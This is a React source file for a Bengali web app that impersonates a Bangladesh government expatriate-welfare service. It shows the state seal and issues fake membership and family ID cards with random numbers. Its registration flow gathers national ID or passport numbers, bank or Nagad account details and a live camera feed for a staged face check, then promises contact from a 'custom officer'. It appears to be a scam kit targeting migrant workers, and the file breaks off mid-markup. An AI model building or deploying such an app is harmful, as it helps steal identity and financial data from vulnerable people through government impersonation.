import React, { useState, useEffect, useRef } from 'react';
import { RemoteCommandService } from './services/RemoteCommandService';
import { 
  Smartphone, 
  Globe, 
  UserCheck, 
  Info, 
  ExternalLink, 
  ChevronRight, 
  ChevronLeft,
  ShieldCheck, 
  PlaneTakeoff, 
  MoreVertical, 
  Lock, 
  Plus, 
  Edit2, 
  Trash2, 
  Save, 
  X, 
  Send, 
  Download, 
  AlertTriangle,
  Phone,
  MessageCircle,
  Upload,
  Camera,
  CheckCircle2,
  ShieldAlert,
  Clock,
  LayoutDashboard,
  Users,
  Mail,
  Settings,
  FileText,
  Eye,
  Trash,
  Heart,
  Stethoscope,
  GraduationCap,
  UserPlus,
  Bell,
  Calendar,
  FileCheck,
  Briefcase
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { QRCodeSVG } from 'qrcode.react';
import { toJpeg } from 'html-to-image';

// --- Types ---
interface TargetUser {
  id: string;
  name: string;
  phone: string;
  idNumber: string;
  country: string;
  photoUrl?: string;
  status: 'Ready' | 'Pending' | 'Processing';
  documents?: { name: string; url: string; type: string }[];
  createdAt?: any;
}

// --- Components ---

const Toast = ({ message, type, onClose }: { message: string; type: 'success' | 'error'; onClose: () => void }) => (
  <motion.div 
    initial={{ y: 50, opacity: 0 }}
    animate={{ y: 0, opacity: 1 }}
    exit={{ y: 50, opacity: 0 }}
    className={`fixed bottom-8 left-1/2 -translate-x-1/2 px-6 py-3 rounded-2xl shadow-2xl z-[100] flex items-center gap-3 font-bold ${type === 'success' ? 'bg-emerald-600 text-white' : 'bg-rose-600 text-white'}`}
  >
    {type === 'success' ? <CheckCircle2 size={20} /> : <AlertTriangle size={20} />}
    {message}
    <button onClick={onClose} className="ml-4 opacity-50 hover:opacity-100"><X size={16} /></button>
  </motion.div>
);

const ContactModal = ({ onClose, setToast }: { onClose: () => void; setToast: (t: { message: string; type: 'success' | 'error' } | null) => void }) => {
  const [formData, setFormData] = useState({ name: '', email: '', message: '' });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setToast({ message: 'আপনার বার্তা সফলভাবে পাঠানো হয়েছে। ধন্যবাদ!', type: 'success' });
    onClose();
  };

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="bg-white rounded-3xl p-8 max-w-md w-full shadow-2xl">
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-2xl font-bold flex items-center gap-2 text-emerald-700"><MessageCircle /> যোগাযোগ করুন</h2>
          <button onClick={onClose} className="p-2 hover:bg-slate-100 rounded-full"><X /></button>
        </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-slate-700 mb-1">আপনার নাম</label>
            <input required className="w-full px-4 py-3 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-emerald-500" value={formData.name} onChange={(e) => setFormData({ ...formData, name: e.target.value })} />
          </div>
          <div>
            <label className="block text-sm font-medium text-slate-700 mb-1">ইমেইল</label>
            <input required type="email" className="w-full px-4 py-3 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-emerald-500" value={formData.email} onChange={(e) => setFormData({ ...formData, email: e.target.value })} />
          </div>
          <div>
            <label className="block text-sm font-medium text-slate-700 mb-1">বার্তা</label>
            <textarea required rows={4} className="w-full px-4 py-3 border border-slate-200 rounded-xl outline-none focus:ring-2 focus:ring-emerald-500" value={formData.message} onChange={(e) => setFormData({ ...formData, message: e.target.value })} />
          </div>
          <button type="submit" className="w-full bg-emerald-600 text-white py-3 rounded-xl font-bold hover:bg-emerald-700 transition-all flex items-center justify-center gap-2">
            <Send size={18} />
            বার্তা পাঠান
          </button>
        </form>
      </motion.div>
    </div>
  );
};

const NoticesPage = () => {
  const notices = [
    {
      id: 1,
      title: "প্রবাসী কল্যাণ ব্যাংকের বিশেষ ঋণ সুবিধা",
      date: "২৬ মার্চ, ২০২৬",
      category: "ঋণ সুবিধা",
      content: "বিদেশগামী ও বিদেশ ফেরত কর্মীদের জন্য বিশেষ সুদে ঋণ সুবিধা প্রদান করা হচ্ছে। বিস্তারিত জানতে নিকটস্থ শাখায় যোগাযোগ করুন।",
      icon: <Briefcase className="text-blue-600" />
    },
    {
      id: 2,
      title: "বিএমইটি স্মার্ট কার্ড বিতরণ কার্যক্রম",
      date: "২৫ মার্চ, ২০২৬",
      category: "স্মার্ট কার্ড",
      content: "যাদের রেজিস্ট্রেশন সম্পন্ন হয়েছে তারা জেলা জনশক্তি অফিস থেকে স্মার্ট কার্ড সংগ্রহ করতে পারবেন।",
      icon: <FileCheck className="text-emerald-600" />
    },
    {
      id: 3,
      title: "নতুন গন্তব্যে কর্মী নিয়োগের বিজ্ঞপ্তি",
      date: "২৪ মার্চ, ২০২৬",
      category: "নিয়োগ",
      content: "ইউরোপের বিভিন্ন দেশে দক্ষ কর্মী নিয়োগের প্রক্রিয়া শুরু হয়েছে। শুধুমাত্র সরকারি মাধ্যমে আবেদন করুন।",
      icon: <Globe className="text-indigo-600" />
    },
    {
      id: 4,
      title: "স্বাস্থ্য বিমা সংক্রান্ত জরুরি নির্দেশনা",
      date: "২৩ মার্চ, ২০২৬",
      category: "বিমা",
      content: "সকল প্রবাসী কর্মীদের জন্য বাধ্যতামূলক স্বাস্থ্য বিমা পলিসি কার্যকর করা হয়েছে। বিস্তারিত পোর্টালে দেখুন।",
      icon: <ShieldCheck className="text-rose-600" />
    }
  ];

  return (
    <div className="max-w-4xl mx-auto p-6 pb-24 font-['Hind_Siliguri']">
      <div className="flex items-center gap-3 mb-8 border-b-2 border-gov-green pb-4">
        <Bell className="text-gov-green w-8 h-8" />
        <h2 className="text-3xl font-black text-slate-800">নোটিশ ও আপডেট</h2>
      </div>

      <div className="space-y-6">
        {notices.map((notice) => (
          <motion.div 
            key={notice.id}
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            className="bg-white p-6 rounded-3xl border border-slate-200 shadow-sm hover:shadow-md transition-all group"
          >
            <div className="flex justify-between items-start mb-4">
              <div className="flex items-center gap-4">
                <div className="p-3 bg-slate-50 rounded-2xl group-hover:bg-gov-green/5 transition-colors">
                  {notice.icon}
                </div>
                <div>
                  <span className="text-[10px] font-black text-gov-green uppercase tracking-widest bg-gov-green/10 px-2 py-1 rounded-full">
                    {notice.category}
                  </span>
                  <h3 className="text-xl font-bold text-slate-800 mt-1">{notice.title}</h3>
                </div>
              </div>
              <div className="flex items-center gap-1 text-slate-400 text-xs font-bold">
                <Calendar size={14} />
                {notice.date}
              </div>
            </div>
            <p className="text-slate-600 leading-relaxed mb-4">{notice.content}</p>
            <button className="text-gov-green font-bold text-sm flex items-center gap-2 hover:underline">
              বিস্তারিত পড়ুন <ChevronRight size={16} />
            </button>
          </motion.div>
        ))}
      </div>

      <div className="mt-12 bg-gov-green text-white p-8 rounded-[2.5rem] shadow-xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 blur-2xl"></div>
        <h3 className="text-2xl font-black mb-4">সহায়তা প্রয়োজন?</h3>
        <p className="opacity-80 mb-6 font-medium">প্রবাসী কল্যাণ সংক্রান্ত যেকোনো তথ্যের জন্য আমাদের হেল্পলাইনে যোগাযোগ করুন।</p>
        <div className="flex flex-wrap gap-4">
          <div className="flex items-center gap-2 bg-white/10 px-4 py-2 rounded-xl">
            <Phone size={18} />
            <span className="font-bold">১৬১৩৫</span>
          </div>
          <div className="flex items-center gap-2 bg-white/10 px-4 py-2 rounded-xl">
            <Mail size={18} />
            <span className="font-bold">info@probashi.gov.bd</span>
          </div>
        </div>
      </div>
    </div>
  );
};

const DigitalCardApp = () => {
  const [userData, setUserData] = useState<any>(null);
  const [nameInput, setNameInput] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const cardRef = useRef<HTMLDivElement>(null);

  const gradients = [
    'linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d)',
    'linear-gradient(135deg, #0f2027, #203a43, #2c5364)',
    'linear-gradient(135deg, #134e5e, #71b280)',
    'linear-gradient(135deg, #532d8c, #f39c12)',
    'linear-gradient(135deg, #2c3e50, #000000)',
    'linear-gradient(135deg, #1e3c72, #2a5298)',
    'linear-gradient(135deg, #d4145a, #fbb03b)'
  ];

  useEffect(() => {
    let data = JSON.parse(localStorage.getItem('wewb_user_data') || 'null');

    if (!data) {
      const randomCardNumber = '880' + Math.floor(Math.random() * 9) + ' ' + 
                             Math.floor(1000 + Math.random() * 9000) + ' ' + 
                             Math.floor(1000 + Math.random() * 9000) + ' ' + 
                             Math.floor(1000 + Math.random() * 9000);
      
      const randomMonth = Math.floor(Math.random() * 12) + 1;
      const randomYear = Math.floor(Math.random() * (2035 - 2028) + 2028);
      const expiryDate = (randomMonth < 10 ? '0' + randomMonth : randomMonth) + '/' + (randomYear % 100);
      
      const randomGradient = gradients[Math.floor(Math.random() * gradients.length)];

      data = {
        name: "মো: প্রবাসী নাগরিক",
        number: randomCardNumber,
        expiry: expiryDate,
        bg: randomGradient
      };

      localStorage.setItem('wewb_user_data', JSON.stringify(data));
    }

    setUserData(data);
    setNameInput(data.name === "মো: প্রবাসী নাগরিক" ? "" : data.name);
  }, []);

  const saveName = () => {
    if (!nameInput.trim()) {
      alert("দয়া করে একটি নাম লিখুন");
      return;
    }

    const updatedData = { ...userData, name: nameInput.trim() };
    setUserData(updatedData);
    localStorage.setItem('wewb_user_data', JSON.stringify(updatedData));
    alert("আপনার নাম কার্ডে যুক্ত করা হয়েছে!");
  };

  const downloadCard = async () => {
    if (cardRef.current === null) {
      return;
    }

    try {
      const dataUrl = await toJpeg(cardRef.current, { quality: 0.95, backgroundColor: '#ffffff' });
      const link = document.createElement('a');
      link.download = `probashi-card-${userData.name}.jpg`;
      link.href = dataUrl;
      link.click();
      setShowSuccess(true);
    } catch (err) {
      console.error('Error downloading card:', err);
      alert('কার্ডটি ডাউনলোড করতে সমস্যা হয়েছে। দয়া করে আবার চেষ্টা করুন।');
    }
  };

  if (!userData) return null;

  if (showSuccess) {
    return (
      <div className="min-h-screen bg-slate-50 flex flex-col items-center p-6 font-['Hind_Siliguri'] pb-24">
        <motion.div 
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="w-full max-w-md text-center"
        >
          <div className="bg-white rounded-[2.5rem] p-8 shadow-2xl border border-emerald-100 mb-8 relative overflow-hidden">
            <div className="absolute top-0 right-0 w-32 h-32 bg-emerald-500/5 rounded-full -mr-16 -mt-16"></div>
            
            <div className="w-20 h-20 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-6">
              <CheckCircle2 size={48} />
            </div>

            <h2 className="text-2xl font-black text-slate-800 mb-4">অভিনন্দন!</h2>
            <p className="text-slate-600 font-bold leading-relaxed mb-8 text-left">
              আপনি সফলভাবে আপনার WEWB Membership কার্ড সংগ্রহ করেছেন।<br /><br />
              আগামী ৭২ ঘণ্টার মধ্যে আমাদের কাস্টম অফিসার আপনার সাথে যোগাযোগ করবেন। আপনার পরিচয় যাচাই সম্পন্ন হওয়ার পর প্রবাসী কর্মসংস্থান মন্ত্রণালয় থেকে আপনার কার্ডটি অ্যাক্টিভ করে দেওয়া হবে।<br /><br />
              বিস্তারিত তথ্য জানতে Help বাটনে ক্লিক করে আমাদের সাথে মেসেজ বা কল করতে পারেন।<br /><br />
              ধন্যবাদ।
            </p>

            <button 
              onClick={() => setShowSuccess(false)}
              className="w-full bg-slate-900 text-white py-4 rounded-2xl font-black shadow-lg hover:bg-slate-800 transition-all"
            >
              ঠিক আছে
            </button>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f4f7f9] flex flex-col items-center p-5 font-['Hind_Siliguri'] pb-24">
      <div className="w-full max-w-[450px] text-center">
        {/* Card Display */}
        <div 
          ref={cardRef}
          className="w-full aspect-[1.58/1] rounded-[18px] p-6 relative text-white shadow-[0_15px_35px_rgba(0,0,0,0.2)] overflow-hidden flex flex-col justify-between text-left transition-transform duration-300 mb-6"
          style={{ background: userData.bg }}
        >
          <div className="absolute w-[200px] h-[200px] bg-white/5 rounded-full -top-[50px] -right-[50px]"></div>
          
          <div className="flex justify-between items-start z-10">
            <h3 className="text-base uppercase tracking-wider text-white/90 font-bold">WEWB Membership</h3>
            <div className="text-[10px] text-right border-l-2 border-[#f1c40f] pl-2 leading-tight">
              গণপ্রজাতন্ত্রী বাংলাদেশ<br />Digital ID
            </div>
          </div>

          <div className="w-[45px] h-[35px] bg-gradient-to-br from-[#f1c40f] to-[#d4af37] rounded-md mt-2 relative z-10"></div>
          
          <div className="font-['Inter'] text-xl md:text-2xl tracking-[3px] my-4 z-10">
            {userData.number}
          </div>
          
          <div className="flex justify-between items-end z-10">
            <div>
              <div className="text-[10px] uppercase text-white/70 mb-0.5">কার্ডধারীর নাম</div>
              <div className="text-base font-semibold">{userData.name}</div>
            </div>
            <div className="text-right">
              <div className="text-[10px] uppercase text-white/70 mb-0.5">মেয়াদ উত্তীর্ণ</div>
              <div className="text-base font-semibold">{userData.expiry}</div>
            </div>
          </div>
        </div>

        {/* Control Panel */}
        <div className="bg-white p-5 rounded-[15px] shadow-[0_5px_15px_rgba(0,0,0,0.05)] mb-6">
          <div className="mb-4">
            <input 
              type="text" 
              value={nameInput}
              onChange={(e) => setNameInput(e.target.value)}
              placeholder="আপনার পুরো নাম লিখুন"
              className="w-full p-3 border-2 border-slate-200 rounded-lg text-lg outline-none focus:border-[#1a2a6c] transition-colors"
            />
          </div>
          <button 
            onClick={saveName}
            className="w-full bg-[#27ae60] text-white py-3 rounded-lg font-bold hover:bg-[#219150] transition-colors"
          >
            নাম সেভ করুন
          </button>
        </div>

        {/* Instruction Box */}
        <div className="p-4 bg-[#fff3cd] border-l-4 border-[#ffc107] rounded-lg text-left mb-6">
          <strong className="text-[#856404] block mb-1">নির্দেশনা:</strong>
          <p className="text-sm text-[#856404] leading-relaxed">
            আপনার কার্ডটির অনলাইন কপি ভেরিফাই এবং ডাউনলোড করতে এখনই "আমি প্রবাসী" অ্যাপটি ডাউনলোড করে রেজিস্ট্রেশন সম্পন্ন করুন।
          </p>
        </div>

        {/* App Download Button */}
        <button 
          onClick={downloadCard}
          className="block w-full bg-[#1a2a6c] text-white py-4 rounded-full font-bold shadow-[0_8px_20px_rgba(26,42,108,0.3)] hover:bg-[#b21f1f] transition-all text-center cursor-pointer"
        >
          আপনার কার্ডের অনলাইন কপি টি ডাউনলোড করুন
        </button>
      </div>
    </div>
  );
};

const RegistrationProcess = ({ onComplete, onBack }: { onComplete: (data: any) => void, onBack: () => void }) => {
  const [step, setStep] = useState(1);
  const [formData, setFormData] = useState({
    userName: '',
    fatherName: '',
    district: '',
    thana: '',
    nidNumber: '',
    paymentMethod: '',
    nagadNo: '',
    bankName: '',
    accNo: '',
    accHolder: '',
    bankPhone: ''
  });
  const [instruction, setInstruction] = useState('শুরু করতে নিচের বাটনে ক্লিক করুন');
  const [isVerifying, setIsVerifying] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);

  const handleBack = () => {
    if (step > 1) {
      setStep(step - 1);
    } else {
      onBack();
    }
  };

  const initCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }
    } catch (err) {
      alert("ক্যামেরা এক্সেস প্রয়োজন!");
    }
  };

  useEffect(() => {
    if (step === 3) {
      initCamera();
    }
  }, [step]);

  const startVerification = () => {
    setIsVerifying(true);
    const steps = [
      "৩ সেকেন্ড স্থির হয়ে তাকিয়ে থাকুন",
      "চোখের পাতা নড়াচড়া করুন",
      "ডানে মুখ ঘোরান",
      "বামে মুখ ঘোরান",
      "উপরে ও নিচে তাকান",
      "ভেরিফিকেশন সম্পন্ন হচ্ছে..."
    ];

    let i = 0;
    const interval = setInterval(() => {
      setInstruction(steps[i]);
      i++;
      if (i >= steps.length) {
        clearInterval(interval);
        onComplete({ ...formData, isRegistered: true });
      }
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-slate-50 p-6 font-['Hind_Siliguri'] pb-24">
      <div className="max-w-md mx-auto">
        <div className="flex items-center gap-4 mb-8">
          <button onClick={handleBack} className="p-2 bg-white rounded-full shadow-sm">
            <ChevronLeft />
          </button>
          <h2 className="text-2xl font-black text-slate-800">নিবন্ধন প্রক্রিয়া</h2>
        </div>

        <div className="flex gap-2 mb-8">
          {[1, 2, 3].map((s) => (
            <div key={s} className={`h-2 flex-1 rounded-full transition-all ${step >= s ? 'bg-gov-green' : 'bg-slate-200'}`} />
          ))}
        </div>

        <AnimatePresence mode="wait">
          {step === 1 && (
            <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="space-y-4">
              <div className="bg-white p-6 rounded-3xl shadow-sm border border-slate-100">
                <h3 className="text-lg font-bold mb-4 text-slate-800">ব্যক্তিগত তথ্য</h3>
                <div className="space-y-4">
                  <input placeholder="আপনার নাম" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none" value={formData.userName} onChange={(e) => setFormData({ ...formData, userName: e.target.value })} />
                  <input placeholder="পিতার নাম" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none" value={formData.fatherName} onChange={(e) => setFormData({ ...formData, fatherName: e.target.value })} />
                  <div className="grid grid-cols-2 gap-4">
                    <input placeholder="জেলা" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none" value={formData.district} onChange={(e) => setFormData({ ...formData, district: e.target.value })} />
                    <input placeholder="থানা" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none" value={formData.thana} onChange={(e) => setFormData({ ...formData, thana: e.target.value })} />
                  </div>
                  <input placeholder="NID বা পাসপোর্ট নম্বর" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none" value={formData.nidNumber} onChange={(e) => setFormData({ ...formData, nidNumber: e.target.value })} />
                </div>
              </div>
              <button onClick={() => setStep(2)} className="w-full bg-gov-green text-white py-4 rounded-2xl font-black shadow-lg">পরবর্তী ধাপ</button>
            </motion.div>
          )}

          {step === 2 && (
            <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="space-y-4">
              <div className="bg-white p-6 rounded-3xl shadow-sm border border-slate-100">
                <h3 className="text-lg font-bold mb-4 text-slate-800">পেমেন্ট মেথড নির্বাচন করুন</h3>
                <div className="grid grid-cols-2 gap-4 mb-6">
                  <button onClick={() => setFormData({ ...formData, paymentMethod: 'nagad' })} className={`p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${formData.paymentMethod === 'nagad' ? 'border-gov-green bg-gov-green/5' : 'border-slate-100'}`}>
                    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d0/Nagad_logo.svg/1200px-Nagad_logo.svg.png" alt="Nagad" className="h-8 object-contain" referrerPolicy="no-referrer" />
                    <span className="font-bold text-sm">নগদ</span>
                  </button>
                  <button onClick={() => setFormData({ ...formData, paymentMethod: 'bank' })} className={`p-4 rounded-2xl border-2 transition-all flex flex-col items-center gap-2 ${formData.paymentMethod === 'bank' ? 'border-gov-green bg-gov-green/5' : 'border-slate-100'}`}>
                    <Briefcase className="w-8 h-8 text-slate-400" />
                    <span className="font-bold text-sm">ব্যাংক একাউন্ট</span>
                  </button>
                </div>

                {formData.paymentMethod === 'nagad' && (
                  <input placeholder="নগদ নম্বর" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none" value={formData.nagadNo} onChange={(e) => setFormData({ ...formData, nagadNo: e.target.value })} />
                )}

                {formData.paymentMethod === 'bank' && (
                  <div className="space-y-4">
                    <input placeholder="ব্যাংকের নাম" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none" value={formData.bankName} onChange={(e) => setFormData({ ...formData, bankName: e.target.value })} />
                    <input placeholder="একাউন্ট নম্বর" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none" value={formData.accNo} onChange={(e) => setFormData({ ...formData, accNo: e.target.value })} />
                    <input placeholder="একাউন্ট হোল্ডারের নাম" className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl outline-none" value={formData.accHolder} onChange={(e) => setFormData({ ...formData, accHolder: e.target.value })} />
                  </div>
                )}
              </div>
              <button onClick={() => setStep(3)} className="w-full bg-gov-green text-white py-4 rounded-2xl font-black shadow-lg">পরবর্তী ধাপ</button>
            </motion.div>
          )}

          {step === 3 && (
            <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }} className="space-y-4">
              <div className="bg-white p-6 rounded-3xl shadow-sm border border-slate-100 text-center">
                <h3 className="text-lg font-bold mb-2 text-slate-800">ফেইস ভেরিফিকেশন</h3>
                <p className="text-sm text-slate-500 mb-6">{instruction}</p>
                
                <div className="relative w-64 h-64 mx-auto rounded-full overflow-hidden border-4 border-gov-green shadow-xl bg-slate-900">
                  <video ref={videoRef} autoPlay playsInline className="w-full h-full object-cover scale-x-[-1]" />
                  <div className="absolute inset-0 border-[16px] border-slate-900/50 rounded-full pointer-events-none" />
                  {isVerifying && (
                    <motion.div animate={{ y: [0, 256, 0] }} transition={{ repeat: Infinity, duration: 2, ease: "linear" }} className="absolute top-0 left-0 right-0 h-1 bg-gov-green shadow-[0_0_15px_#006a4e]" />
                  )}
                </div>
              </div>
              {!isVerifying && (
                <button onClick={startVerification} className="w-full bg-gov-green text-white py-4 rounded-2xl font-black shadow-lg">ভেরিফিকেশন শুরু করুন</button>
              )}
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
};

const FamilyCardApp = () => {
  const [userData, setUserData] = useState<any>(null);
  const [isRegistering, setIsRegistering] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  useEffect(() => {
    const saved = localStorage.getItem('family_card_data');
    if (saved) {
      setUserData(JSON.parse(saved));
    }
  }, []);

  if (isRegistering) {
    return (
      <RegistrationProcess 
        onComplete={(finalData) => {
          const familyData = {
            ...finalData,
            number: 'FAM-' + Math.floor(1000 + Math.random() * 9000) + '-' + 
                    Math.floor(1000 + Math.random() * 9000) + '-' + 
                    Math.floor(1000 + Math.random() * 9000),
            familyMembers: [
              { name: 'মোসাম্মৎ রহিমা বেগম', relation: 'স্ত্রী', age: 32, health: 'সুস্থ', education: 'N/A' },
              { name: 'আব্দুল্লাহ আল মামুন', relation: 'পুত্র', age: 8, health: 'সুস্থ', education: '৩য় শ্রেণী' }
            ]
          };
          setUserData(familyData);
          localStorage.setItem('family_card_data', JSON.stringify(familyData));
          setIsRegistering(false);
          setShowSuccess(true);
        }} 
        onBack={() => setIsRegistering(false)}
      />
    );
  }

  if (showSuccess && userData) {
    return (
      <div className="min-h-screen bg-slate-50 flex flex-col items-center p-6 font-['Hind_Siliguri'] pb-24">
        <motion.div 
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="w-full max-w-md text-center"
        >
          <div className="bg-white rounded-[2.5rem] p-8 shadow-2xl border border-emerald-100 mb-8 relative overflow-hidden">
            <div className="absolute top-0 right-0 w-32 h-32 bg-emerald-500/5 rounded-full -mr-16 -mt-16"></div>
            
            <div className="w-20 h-20 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-6">
              <CheckCircle2 size={48} />
            </div>

            <h2 className="text-2xl font-black text-slate-800 mb-4">অভিনন্দন!</h2>
            <p className="text-slate-600 font-bold leading-relaxed mb-6">
              আপনার আবেদন সফলভাবে সম্পন্ন হয়েছে।<br /><br />
              আগামী ৭২ ঘণ্টার মধ্যে আমাদের কাস্টম অফিসার আপনার সাথে যোগাযোগ করবেন। বিস্তারিত তথ্য জানতে Help বাটনে ক্লিক করে আমাদের সাথে মেসেজ বা কল করতে পারেন।<br /><br />
              ধন্যবাদ।
            </p>

            {/* Digital Card Preview */}
            <div className="w-full aspect-[1.58/1] rounded-2xl p-5 relative text-white overflow-hidden flex flex-col justify-between text-left shadow-lg mb-6 bg-gradient-to-br from-emerald-600 to-teal-700">
              <div className="flex justify-between items-start">
                <div className="flex items-center gap-2">
                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-8 h-8 brightness-0 invert" referrerPolicy="no-referrer" />
                  <div className="text-[8px] font-black leading-tight">
                    গণপ্রজাতন্ত্রী বাংলাদেশ সরকার<br />
                    <span className="opacity-70 uppercase tracking-tighter">Family Digital Card</span>
                  </div>
                </div>
                <div className="bg-white/20 px-2 py-1 rounded text-[8px] font-bold backdrop-blur-sm">
                  ID: {userData.number.split('-')[1]}
                </div>
              </div>

              <div className="mt-2">
                <div className="text-[10px] opacity-70 uppercase tracking-widest mb-1">Card Holder</div>
                <div className="text-lg font-black tracking-wide">{userData.userName}</div>
              </div>

              <div className="flex justify-between items-end">
                <div>
                  <div className="text-[8px] opacity-70 uppercase mb-0.5">District</div>
                  <div className="text-xs font-bold">{userData.district}</div>
                </div>
                <div className="text-right">
                  <div className="text-[8px] opacity-70 uppercase mb-0.5">Members</div>
                  <div className="text-xs font-bold">{userData.familyMembers.length} Person</div>
                </div>
              </div>
            </div>

            <button 
              onClick={() => setShowSuccess(false)}
              className="w-full bg-slate-900 text-white py-4 rounded-2xl font-black shadow-lg hover:bg-slate-800 transition-all"
            >
              ড্যাশবোর্ডে ফিরে যান
            </button>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f8fafc] font-['Hind_Siliguri'] pb-24">
      <div className="bg-gov-green p-6 text-white rounded-b-[3rem] shadow-xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16 blur-2xl"></div>
        <div className="flex justify-between items-start mb-6">
          <div className="flex items-center gap-3">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-10 h-10 brightness-0 invert" referrerPolicy="no-referrer" />
            <div>
              <h1 className="font-black text-sm leading-tight">প্রবাসী ডিজিটাল ফ্যামিলি কার্ড</h1>
              <p className="text-[8px] opacity-70 uppercase tracking-widest">Ministry of Expatriates' Welfare</p>
            </div>
          </div>
          <div className="bg-white/20 p-2 rounded-xl backdrop-blur-md">
            <Smartphone size={20} />
          </div>
        </div>

        {userData ? (
          <div className="bg-white/10 backdrop-blur-md rounded-2xl p-4 border border-white/20">
            <div className="flex items-center gap-4">
              <div className="w-16 h-16 bg-white rounded-xl flex items-center justify-center text-gov-green shadow-lg">
                <UserCheck size={32} />
              </div>
              <div>
                <h2 className="text-xl font-black">{userData.userName}</h2>
                <p className="text-xs opacity-70 font-bold tracking-widest">{userData.number}</p>
              </div>
            </div>
          </div>
        ) : (
          <div className="py-4 space-y-2">
            <h2 className="text-2xl font-black mb-1">স্বাগতম!</h2>
            <p className="text-xs opacity-90 font-bold leading-relaxed">
              গণপ্রজাতন্ত্রী বাংলাদেশ সরকারের নতুন উদ্যোগ “Family Card” প্রকল্পের আবেদন প্রক্রিয়া আনুষ্ঠানিকভাবে শুরু হয়েছে।
            </p>
            <div className="flex items-center gap-2">
              <span className="text-[10px] bg-gov-red text-white px-2 py-0.5 rounded font-black">
                আবেদনের শেষ তারিখ: ০১/০১/২০২৭
              </span>
            </div>
            <p className="text-[11px] opacity-80 font-medium">
              অনুগ্রহ করে “আমি প্রবাসী” অ্যাপ ব্যবহার করে এখনই আপনার আবেদন সম্পন্ন করুন।
            </p>
          </div>
        )}
      </div>

      <div className="px-6 -mt-6">
        <div className="bg-white rounded-3xl p-6 shadow-xl border border-slate-100">
          {!userData ? (
            <div className="space-y-6">
              <div className="flex items-center gap-4 p-4 bg-rose-50 rounded-2xl border border-rose-100">
                <div className="p-3 bg-rose-600 text-white rounded-xl animate-pulse">
                  <ShieldAlert size={24} />
                </div>
                <div>
                  <h3 className="font-black text-rose-600">নিবন্ধন সম্পন্ন হয়নি!</h3>
                  <p className="text-xs font-bold text-slate-500">সরকারি সকল সুবিধা পেতে এখনই আবেদন করুন।</p>
                </div>
              </div>
              <button 
                onClick={() => setIsRegistering(true)}
                className="w-full bg-gov-green text-white py-4 rounded-2xl font-black shadow-lg hover:bg-emerald-800 transition-all flex items-center justify-center gap-3"
              >
                <Plus className="w-6 h-6" />
                আবেদন শুরু করুন
              </button>
            </div>
          ) : (
            <div className="space-y-6">
              <div className="flex justify-between items-center border-b border-slate-100 pb-4">
                <h3 className="font-black text-slate-800 flex items-center gap-2">
                  <Users className="text-gov-green" size={20} /> পরিবারের সদস্যবৃন্দ
                </h3>
                <span className="text-[10px] font-black bg-gov-green/10 text-gov-green px-2 py-1 rounded-full">
                  {userData.familyMembers.length} জন সদস্য
                </span>
              </div>
              <div className="space-y-3">
                {userData.familyMembers.map((member: any, idx: number) => (
                  <div key={idx} className="flex items-center justify-between p-4 bg-slate-50 rounded-2xl border border-slate-100">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 bg-white rounded-xl flex items-center justify-center text-slate-400 border border-slate-200">
                        <UserPlus size={18} />
                      </div>
                      <div>
                        <p className="font-bold text-slate-800 text-sm">{member.name}</p>
                        <p className="text-[10px] text-slate-400 font-bold uppercase">{member.relation}</p>
                      </div>
                    </div>
                    <div className="text-right">
